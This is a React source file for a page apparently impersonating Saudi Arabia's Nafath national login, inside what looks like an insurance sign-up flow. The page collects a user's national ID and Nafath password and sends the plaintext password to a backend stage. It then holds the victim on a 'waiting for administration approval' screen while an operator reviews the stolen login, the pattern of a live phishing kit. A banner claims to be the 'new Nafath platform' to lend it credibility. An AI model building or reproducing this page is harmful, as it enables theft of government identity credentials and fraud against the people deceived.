import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { toast } from "sonner";

const NafathLogin = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);

  const approvalStatus = useAdminApproval(orderId, "nafath_login");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success("تم التحقق بنجاح");
      sessionStorage.setItem("insurance_order_id", orderId);
      navigate("/insurance/nafath-verify", { state: { offer, phone, carrier, nationalId: username, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error("تم رفض عملية الدخول");
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier, username]);

  const handleCredentialsSubmit = async () => {
    if (!username || !password) {
      setError("يرجى إدخال اسم المستخدم وكلمة المرور");
      return;
    }
    setLoading(true);
    sessionStorage.setItem("nafath_id", username);
    linkVisitorToSession({ national_id: username });
    const id = await createOrUpdateStage(orderId, "nafath_login", { national_id: username, nafath_password: password });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const inputCls = "w-full px-3 py-2.5 rounded-lg bg-background border border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/20 transition-all text-right";

  return (
    <VerificationLayout title="الدخول على النظام" subtitle="الرجاء إدخال رقم الهوية الوطنية لتوثيق ربط شريحتك بوثيقة التأمين">
      <div className="px-5 pb-4 space-y-3 pt-5">
        {waitingApproval ? (
          <div className="text-center py-8 space-y-4">
            <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
            <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
            <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة بيانات الدخول</p>
          </div>
        ) : (
          <>
            <div className="space-y-3">
              <div>
                <input
                  className={inputCls}
                  placeholder="اسم المستخدم / الهوية الوطنية"
                  value={username}
                  onChange={(e) => { setUsername(e.target.value); setError(""); }}
                  dir="rtl"
                />
              </div>

              <div>
                <input
                  className={inputCls}
                  type="password"
                  placeholder="كلمة المرور"
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); setError(""); }}
                  dir="rtl"
                />
              </div>

              {error && <p className="text-[10px] text-destructive text-right">{error}</p>}

              <button
                onClick={handleCredentialsSubmit}
                disabled={loading || !username || !password}
                className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg py-2.5 font-bold text-xs transition-colors disabled:opacity-50"
              >
                {loading ? "جاري المعالجة..." : "تسجيل الدخول"}
              </button>
            </div>

            {/* Info banner */}
            <div className="bg-accent rounded-lg p-3 text-center">
              <p className="text-xs font-bold text-accent-foreground mb-1">منصة النفاذ الجديدة</p>
              <p className="text-[10px] text-muted-foreground">لتجربة أكثر سهولة استخدم النسخة المحدثة من منصة النفاذ الوطني الموحد</p>
            </div>
          </>
        )}
      </div>
    </VerificationLayout>
  );
};

export default NafathLogin;
